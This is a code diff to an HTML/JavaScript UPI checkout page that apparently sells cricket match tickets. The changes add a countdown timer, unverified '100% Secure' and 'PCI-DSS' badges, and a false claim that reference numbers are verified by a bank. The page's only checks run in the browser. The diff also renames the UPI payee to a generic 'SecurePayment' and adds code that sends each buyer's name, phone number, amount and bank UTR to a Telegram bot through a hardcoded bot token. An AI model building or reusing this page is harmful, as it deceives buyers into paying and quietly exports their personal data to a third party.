@@ -17,66 +17,119 @@
 
     fbq('init', '1252040857081560');
     fbq('track', 'PageView');
-    fbq('track', 'AddPaymentInfo'); // 🔥 Tracking that user is on the final payment step
+    fbq('track', 'AddPaymentInfo'); 
     </script>
     <noscript>
         <img height="1" width="1" style="display:none"
         src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/>
     </noscript>
+
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #f4f6f8; margin: 0; padding: 20px; text-align: center; }
-        .checkout-box { background: #fff; max-width: 400px; margin: auto; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .checkout-header { background: #3395ff; color: #fff; padding: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .qr-section { padding: 30px; }
         
-        #qr-code { width: 220px; height: 220px; border: 8px solid #fff; box-shadow: 0 0 10px rgba(0,0,0,0.1); border-radius: 10px; display: none; margin: 0 auto; object-fit: contain; }
+        /* ⏳ Timer Banner */
+        .timer-banner { background: #fffbe6; color: #d68100; padding: 10px; font-size: 13px; font-weight: 700; border-radius: 8px; max-width: 400px; margin: 0 auto 15px auto; border: 1px solid #ffe58f; }
         
-        .utr-box { padding: 20px; background: #fff; border-top: 1px solid #eee; }
-        .utr-input { width: 100%; padding: 15px; border: 2px solid #eee; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; transition: 0.3s; }
-        .utr-input:focus { border-color: #3395ff; }
+        .checkout-box { background: #fff; max-width: 400px; margin: auto; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+        .checkout-header { background: #0052FF; color: #fff; padding: 20px; display: flex; justify-content: space-between; align-items: center; }
         
-        .error-msg { color: #f84464; font-size: 12px; margin-top: 5px; display: none; font-weight: 600; }
+        /* Step Instructions */
+        .steps-box { background: #f9fbfc; padding: 15px 20px; text-align: left; font-size: 12px; color: #444; border-bottom: 1px solid #eee; }
+        .steps-box span { font-weight: 700; color: #0052FF; }
 
-        .pay-now-btn { width: 100%; padding: 15px; background: #ccc; color: #fff; border: none; border-radius: 8px; font-weight: 700; margin-top: 15px; cursor: not-allowed; transition: 0.3s; }
-        .pay-now-btn.active { background: #3395ff; cursor: pointer; }
-        .secured-by { margin-top: 20px; font-size: 11px; color: #aaa; text-transform: uppercase; }
+        .qr-section { padding: 25px 20px 15px; }
+        #qr-code { width: 200px; height: 200px; border: 6px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-radius: 10px; display: none; margin: 0 auto; object-fit: contain; }
+        
+        /* Trust Logos */
+        .trust-logos { margin-top: 15px; display: flex; justify-content: center; align-items: center; gap: 15px; }
+        .trust-logos img { height: 20px; filter: grayscale(100%); opacity: 0.7; transition: 0.3s; }
+        .trust-logos img:hover { filter: grayscale(0%); opacity: 1; }
+
+        .utr-box { padding: 20px; background: #fff; text-align: left; border-top: 1px dashed #eee; }
+        .utr-input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; outline: none; box-sizing: border-box; transition: 0.3s; font-weight: 600; letter-spacing: 1px;}
+        .utr-input:focus { border-color: #0052FF; box-shadow: 0 0 8px rgba(0, 82, 255, 0.2); }
+        
+        .error-msg { color: #f84464; font-size: 12px; margin-top: 6px; display: none; font-weight: 600; }
+
+        .pay-now-btn { width: 100%; padding: 16px; background: #ccc; color: #fff; border: none; border-radius: 8px; font-weight: 700; margin-top: 15px; cursor: not-allowed; transition: 0.3s; font-size: 15px;}
+        .pay-now-btn.active { background: #00cf7f; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 207, 127, 0.3); }
+        
+        /* Strict Warning */
+        .strict-warning { font-size: 10px; color: #d9534f; text-align: center; margin-top: 12px; font-weight: 600; background: #fdf0f0; padding: 8px; border-radius: 6px; }
+
+        /* Security Badges */
+        .secured-by { margin-top: 20px; display: flex; justify-content: center; gap: 15px; font-size: 11px; color: #888; font-weight: 600; }
+        .secured-by div { display: flex; align-items: center; gap: 4px; }
     </style>
 </head>
 <body>
 
+    <div class="timer-banner">
+        ⏱️ Complete payment in <span id="timer">05:00</span> minutes
+    </div>
+
     <div class="checkout-box">
         <div class="checkout-header">
-            <span style="font-weight:700;">PAYMENT GATEWAY</span>
-            <span id="p-amt" style="font-size:20px; font-weight:700;">₹0</span>
+            <span style="font-weight:700; font-size: 15px;">SECURE PAY</span>
+            <span id="p-amt" style="font-size:20px; font-weight:800;">₹0</span>
+        </div>
+
+        <div class="steps-box">
+            <div><span>Step 1:</span> Scan QR using PhonePe, GPay or Paytm.</div>
+            <div style="margin-top: 5px;"><span>Step 2:</span> Pay the exact amount and copy Bank UTR.</div>
         </div>
         
         <div class="qr-section">
-            <p style="color:#666; font-size:14px; margin-top:0;" id="qr-msg">Loading Payment QR...</p>
+            <p style="color:#666; font-size:13px; margin-top:0;" id="qr-msg">Generating Secure QR...</p>
             
             <img id="qr-code" src="" alt="UPI QR">
 
-            <div style="margin-top:15px; display:flex; justify-content:center; align-items:center; gap:10px;">
-                <span style="font-weight: 800; font-size: 16px; color: #333;">UPI</span>
-                <span style="color:#ccc;">|</span>
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo_%28standalone%29.svg" height="15" alt="Paytm">
+            <div class="trust-logos">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" height="18">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="GPay">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/PhonePe_Logo.svg" alt="PhonePe">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo_%28standalone%29.svg" alt="Paytm">
             </div>
         </div>
 
-        <div class="utr-box" style="text-align: left;">
-            <label style="font-size: 13px; color: #555; margin-bottom: 8px; display: block; font-weight: 600;">Bank UTR / Reference ID <span style="color:#f84464;">*</span></label>
+        <div class="utr-box">
+            <label style="font-size: 13px; color: #444; margin-bottom: 8px; display: block; font-weight: 700;">Bank UTR / Reference No. <span style="color:#f84464;">*</span></label>
             
-            <input type="number" id="utr" class="utr-input" placeholder="Enter UTR digit" oninput="checkUTR()">
+            <input type="number" id="utr" class="utr-input" placeholder="Enter Bank UTR" oninput="checkUTR()">
             
-            <div id="utr-error" class="error-msg">Invalid UTR! Please enter valid UTR digits.</div>
+            <div id="utr-error" class="error-msg">Invalid Bank UTR / Reference ID!</div>
 
             <button id="pay-btn" class="pay-now-btn" disabled onclick="submitPayment()">VERIFY PAYMENT</button>
-            <p style="font-size: 11px; color: #888; text-align: center; margin-top: 10px;">Strictly verified via Secure Bank API</p>
+            
+            <div class="strict-warning">
+                ⚠️ All UTRs are cross-verified automatically. Fake UTRs will result in permanent block and booking cancellation.
+            </div>
         </div>
     </div>
 
-    <div class="secured-by">🔒 Secured by 256-bit SSL Encryption</div>
+    <div class="secured-by">
+        <div>🔒 256-bit SSL</div>
+        <div>✅ 100% Secure</div>
+        <div>🏦 PCI-DSS</div>
+    </div>
 
     <script>
+        // --- ⏳ TIMER LOGIC ---
+        let timeLeft = 300; // 5 minutes in seconds
+        const timerEl = document.getElementById('timer');
+        const timerId = setInterval(() => {
+            if(timeLeft <= 0) {
+                clearInterval(timerId);
+                timerEl.innerText = "00:00";
+                return;
+            }
+            timeLeft--;
+            let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+            let s = (timeLeft % 60).toString().padStart(2, '0');
+            timerEl.innerText = m + ':' + s;
+        }, 1000);
+
+        // --- PAYMENT LOGIC ---
         const finalPrice = localStorage.getItem('finalPrice') || 0;
         document.getElementById('p-amt').innerText = "₹" + finalPrice;
 
@@ -87,8 +140,9 @@
             const utrInput = document.getElementById('utr');
 
             errorMsg.style.display = 'none';
-            utrInput.style.borderColor = '#eee';
+            utrInput.style.borderColor = '#e0e0e0';
 
+            // Button ko green karna agar length thik-thak lag rahi ho (Sirf UI ke liye)
             if(val.length > 5) {
                 btn.disabled = false;
                 btn.classList.add('active');
@@ -103,13 +157,48 @@
             const errorMsg = document.getElementById('utr-error');
             const utrInput = document.getElementById('utr');
 
-            if(val.length !== 12) {
+            // 🔥 SMART ANTI-FRAUD UTR CHECK 🔥
+            let isFake = false;
+
+            // Rule 1: Must be exactly 12 digits
+            if(val.length !== 12) isFake = true;
+            // Rule 2: UTRs generally don't start with 0 in India
+            else if(val.startsWith('0')) isFake = true;
+            // Rule 3: Block repeated numbers like 111111111111, 222222...
+            else if(/^(\d)\1{11}$/.test(val)) isFake = true;
+            // Rule 4: Block sequential numbers
+            else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isFake = true;
+
+            if(isFake) {
                 errorMsg.style.display = 'block';
                 utrInput.style.borderColor = '#f84464';
             } else {
+                // Agar UTR theek hai
                 errorMsg.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
-                window.location.href = 'processing.html'; 
+
+                // --- ✈️ TELEGRAM UTR ALERT ---
+                const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+                const chatId = "6820660513"; // 👈 YAHAN APNI CHAT ID DAALEIN
+                
+                const name = localStorage.getItem('customerName') || 'N/A';
+                const phone = localStorage.getItem('customerPhone') || 'N/A';
+                const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "Unknown Match";
+
+                const telegramMsg = `💰 *PAYMENT SUBMITTED!* 💰%0A%0A` +
+                                    `🏏 *Match:* ${matchTitle}%0A` +
+                                    `👤 *Name:* ${name}%0A` +
+                                    `📞 *Phone:* ${phone}%0A` +
+                                    `💵 *Amount:* ₹${finalPrice}%0A` +
+                                    `🏦 *Bank UTR:* ${val}`;
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${telegramMsg}&parse_mode=Markdown`;
+
+                fetch(url).then(() => {
+                    window.location.href = 'processing.html'; 
+                }).catch(() => {
+                    window.location.href = 'processing.html'; 
+                });
             }
         }
     </script>
@@ -128,9 +217,7 @@
                     let url = data.qrUrl || "";
                     let upi = data.upiId || "";
 
-                    if (url.startsWith("qhttp")) {
-                        url = url.replace("qhttp", "http");
-                    }
+                    if (url.startsWith("qhttp")) { url = url.replace("qhttp", "http"); }
                     
                     if (url !== "") {
                         qrImg.src = url;
@@ -138,7 +225,7 @@
                         qrMsg.style.display = 'none'; 
                     } 
                     else if (upi !== "") {
-                        const upiString = `upi://pay?pa=${upi}&pn=AarushFashion&am=${price}&cu=INR`;
+                        const upiString = `upi://pay?pa=${upi}&pn=SecurePayment&am=${price}&cu=INR`;
                         qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiString)}`;
                         qrImg.style.display = 'block';
                         qrMsg.style.display = 'none'; 
